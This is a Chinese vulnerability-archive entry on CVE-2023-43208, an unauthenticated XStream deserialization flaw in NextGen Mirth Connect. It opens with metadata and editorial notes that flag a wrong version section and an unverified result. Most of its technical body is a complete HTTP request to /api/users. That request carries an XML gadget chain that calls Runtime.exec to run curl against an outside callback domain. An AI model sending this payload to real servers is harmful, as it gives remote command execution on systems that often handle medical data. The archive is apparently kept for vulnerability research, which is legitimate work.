---
source: "wy876 漏洞文库"
cve: "CVE-2023-43208"
identifier_role: "primary"
primary_identifiers: "CVE-2023-43208"
referenced_identifiers: ""
identifier_status: "unknown"
title: "NextGenMirthConnectXStream存在反序列化远程代码执行漏洞"
product: "NextGen Mirth Connect"
record_type: "vulnerability"
document_type: "反序列化PoC"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "文称未认证/api/users；依XStream及Commons库可用gadget；实际版本未列"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/NextGenMirthConnectXStream%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/lgpb79rrbo0w37b0"
id: "vw-12c5e9c9d68e51749d133e2f"
entity_id: "ve-12c5e9c9d68e51749d133e2f"
schema_version: "1"
---

# NextGenMirthConnectXStream存在反序列化远程代码执行漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：NextGen Mirth Connect
- 文献类型：反序列化PoC
- 版本、权限及部署边界：文称未认证/api/users；依XStream及Commons库可用gadget；实际版本未列
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 影响版本章节误填title搜索指纹，完全缺版本/修复范围，应拆正确字段
2. 只给XML触发出站curl，无回显或回连证据，无法由文本断言实际成功/写后门
3. curl链接是固定第三方域名，历史记载不代表当前回连授权；系统需curl和出站网络
4. 需要区分Mirth产品漏洞与一般XStream配置风险，并补厂商修复及43208对前次修复绕过关系

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/lgpb79rrbo0w37b0>
- 原文参考链接（未重新核验）：<http://jveuewgzdi.iyhc.eu.org>
- 原文参考链接（未重新核验）：<https://github.com/wy876/POC>

### 归档技术正文

# 一、漏洞简介
NextGen Mirth Connect XStream反序列化远程代码执行漏洞(CVE-2023-43208)，未经身份验证的远程攻击者可利用此漏洞写入后门文件，执行任意命令，导致服务器被控。

# 二、影响版本
+ `title="Mirth Connect Administrator"`
+ 特征


# 三、漏洞复现
```plain
POST /api/users HTTP/1.1
Host: 
X-Requested-With: OpenAPI
Content-Type: application/xml

<sorted-set>
	<string>abcd</string>
		<dynamic-proxy>
			<interface>java.lang.Comparable</interface>
			<handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
			  <target class="org.apache.commons.collections4.functors.ChainedTransformer">
				<iTransformers>
				  <org.apache.commons.collections4.functors.ConstantTransformer>
					<iConstant class="java-class">java.lang.Runtime</iConstant>
				  </org.apache.commons.collections4.functors.ConstantTransformer>
				  <org.apache.commons.collections4.functors.InvokerTransformer>
					<iMethodName>getMethod</iMethodName>
					<iParamTypes>
					  <java-class>java.lang.String</java-class>
					  <java-class>[Ljava.lang.Class;</java-class>
					</iParamTypes>
					<iArgs>
					  <string>getRuntime</string>
					  <java-class-array/>
					</iArgs>
				  </org.apache.commons.collections4.functors.InvokerTransformer>
				  <org.apache.commons.collections4.functors.InvokerTransformer>
					<iMethodName>invoke</iMethodName>
					<iParamTypes>
					  <java-class>java.lang.Object</java-class>
					  <java-class>[Ljava.lang.Object;</java-class>
					</iParamTypes>
					<iArgs>
					  <null/>
					  <object-array/>
					</iArgs>
				  </org.apache.commons.collections4.functors.InvokerTransformer>
				  <org.apache.commons.collections4.functors.InvokerTransformer>
					<iMethodName>exec</iMethodName>
					<iParamTypes>
					  <java-class>java.lang.String</java-class>
					</iParamTypes>
					<iArgs>
					  <string>curl http://jveuewgzdi.iyhc.eu.org</string>
					</iArgs>
				  </org.apache.commons.collections4.functors.InvokerTransformer>
				</iTransformers>
			  </target>
			  <methodName>transform</methodName>
			  <eventTypes>
				<string>compareTo</string>
			  </eventTypes>
		</handler>
	</dynamic-proxy>
</sorted-set>
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lgpb79rrbo0w37b0>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
